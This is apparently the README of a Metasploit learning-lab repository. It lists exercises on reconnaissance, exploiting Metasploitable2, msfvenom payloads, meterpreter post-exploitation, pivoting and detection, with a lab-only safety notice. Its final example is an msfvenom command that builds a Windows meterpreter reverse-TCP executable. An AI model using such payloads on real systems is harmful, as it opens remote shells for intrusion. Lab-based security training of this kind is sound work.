# Metasploit Exercises — Learning Lab

A progressive, hands-on set of Metasploit exercises to build practical offensive security skills in an isolated lab environment.

**Legal & Safety (Read first)**  
**This repository is for educational use only.** Run all exercises inside VMs or CTF platforms you own or have explicit permission to use. Do not target public networks, production systems, or third-party hosts.

---

## Repo layout
See `exercises/` for step-by-step walkthroughs:
- `01-msfconsole-basics.md` — msfconsole navigation, module discovery
- `02-recon-and-nmap.md` — scanning, importing results to msfdb
- `03-exploit-metasp2.md` — exploit against Metasploitable2 (lab-only)
- `04-msfvenom-payloads.md` — msfvenom examples (commands only)
- `05-meterpreter-post-exploit.md` — meterpreter commands & post-exploit hygiene
- `06-pivoting.md` — routing/pivoting using meterpreter
- `07-module-writing.md` — reading & modifying Metasploit modules
- `08-automation-rc-scripts.md` — resource scripts & automation examples
- `09-detection-blue-team.md` — host/network indicators & detection notes
- `resources.md` — links to official docs and vulnerable VM downloads

---

## How to use
1. Create an isolated lab network (host-only or internal network).  
2. Download test targets (Metasploitable2/3, VulnHub boxes, TryHackMe rooms). Do **not** upload VM images to this repo.  
3. Follow each `exercises/*.md`. Each exercise includes commands, checkpoints, and expected outputs.  
4. Keep your repo updated with screenshots and notes of your findings (no payload binaries).

---

## Example commands (safe examples)
```bash
# start msfconsole
msfconsole

# search for an apache exploit
search type:exploit name:apache

# generate a sample payload (command only — do not commit the output binary)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f exe -o /tmp/shell.exe
